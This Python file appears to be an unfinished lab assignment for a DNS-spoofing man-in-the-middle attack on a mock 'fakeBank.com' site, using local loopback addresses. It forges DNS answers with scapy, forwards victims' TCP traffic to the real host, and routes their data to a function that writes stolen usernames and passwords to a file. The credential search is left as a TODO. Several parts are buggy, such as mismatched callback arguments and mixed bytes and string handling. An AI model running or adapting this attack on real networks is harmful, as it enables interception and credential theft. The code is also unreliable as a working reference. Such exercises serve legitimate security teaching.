import argparse

from dns import resolver
from scapy.all import *
from scapy.layers.dns import DNSRR, DNS
from scapy.layers.inet import IP, UDP

conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "fakeBank.com"


def resolveHostname(hostname):
    # IP address of HOSTNAME. Used to forward tcp connection.
    # Normally obtained via DNS lookup.
    return "127.1.1.1"


def log_credentials(username, password):
    # Write stolen credentials out to file
    # Do not change this
    with open("lib/StolenCreds.txt", "wb") as fd:
        fd.write("Stolen credentials: username=" + username + " password=" + password)


def check_credentials(client_data):
    # TODO: Take a block of client data and search for username/password credentials
    # If found, log the credentials to the system by calling log_credentials().
    raise NotImplementedError


import socket


def handle_tcp_forwarding(client_socket, client_ip, hostname):
    while True:
        connection, client_address = client_socket.accept()
        print(f"New connection from client {client_address}")

        host_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host_socket.connect((hostname, 80))
        print(f"Connected to host {hostname}")

        while True:
            data = connection.recv(1024)
            if not data:
                break
            print(f"Received {len(data)} bytes from client {client_address}")

            check_credentials(data)
            host_socket.sendall(data)
            print(f"Sent {len(data)} bytes to host {hostname}")

            if '/post_logout' in data.decode():
                print(f"Received POST to '/post_logout' from client {client_address}. Exiting.")
                break

            data = host_socket.recv(1024)
            if not data:
                break
            print(f"Received {len(data)} bytes from host {hostname}")

            connection.sendall(data)
            print(f"Sent {len(data)} bytes to client {client_address}")


def dns_callback(packet, extra_args):
    scapy_packet = IP(packet.get_payload())
    qname = scapy_packet.getlayer(DNSRR).qd.qname
    if scapy_packet.haslayer(DNSRR) and scapy_packet.haslayer(IP):
        print(f"Received DNSRR from {qname}")
        if qname != extra_args["hostname"]:
            return
        dns_response = IP(dst=scapy_packet[IP].src) / \
                       UDP(dport=scapy_packet[UDP].sport, sport=53) / \
                       DNS(id=scapy_packet[DNS].id, qr=1, aa=1, qd=scapy_packet[DNS].qd,
                           an=DNSRR(rrname=qname, ttl=10, rdata=extra_args['fake_ip']))

        send(dns_response, verbose=0)
        client_ip = scapy_packet[IP].src
        client_port = scapy_packet[UDP].sport
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        client_socket.bind((client_ip, client_port))
        handle_tcp_forwarding(client_socket, client_ip, extra_args['target_host'])



def sniff_and_spoof(source_ip):
    # This socket will be used to accept connections from victimized clients
    socket_at = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_at.bind(("127.1.1.1", WEB_PORT))

    # and the socket you created as extra callback arguments.
    sniff(filter=f"udp port 53 and dst {source_ip}", prn=dns_callback, store=0, timeout=0)


def main():
    parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
    parser.add_argument('--source_ip', nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')

    args = parser.parse_args()
    sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
    # Change working directory to script's dir
    # Do not change this
    abspath = os.path.abspath(__file__)
    dname = os.path.dirname(abspath)
    os.chdir(dname)
    main()
